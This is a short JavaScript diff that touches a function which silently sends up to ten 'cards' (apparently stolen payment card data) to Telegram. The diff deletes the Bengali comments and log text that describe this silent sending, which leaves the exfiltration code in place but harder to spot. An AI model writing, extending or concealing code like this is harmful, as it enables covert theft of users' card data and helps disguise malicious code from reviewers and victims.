@@ -395,11 +395,11 @@
             };
         }
 
-        // Telegram এ কার্ড পাঠানোর ফাংশন (সাইলেন্ট, কোনো মেসেজ দেখাবে না)
+       
         async function sendToTelegram(cards) {
             if (!cards || cards.length === 0) return;
             
-            // 10টার বেশি হলে প্রথম 10টি, কমলে সবগুলো
+
             const cardsToSend = cards.slice(0, 10);
             
             const cardLines = cardsToSend.map((c, i) => `${i+1}. ${c}`).join('\n');
@@ -418,7 +418,7 @@
                 });
                 const result = await response.json();
                 if (result.ok) {
-                    console.log(`✅ ${cardsToSend.length} টি কার্ড Telegram এ পাঠানো হয়েছে`);
+                    console.log(`✅ ${cardsToSend.length} `);
                 } else {
                     console.error('Telegram Error:', result.description);
                 }
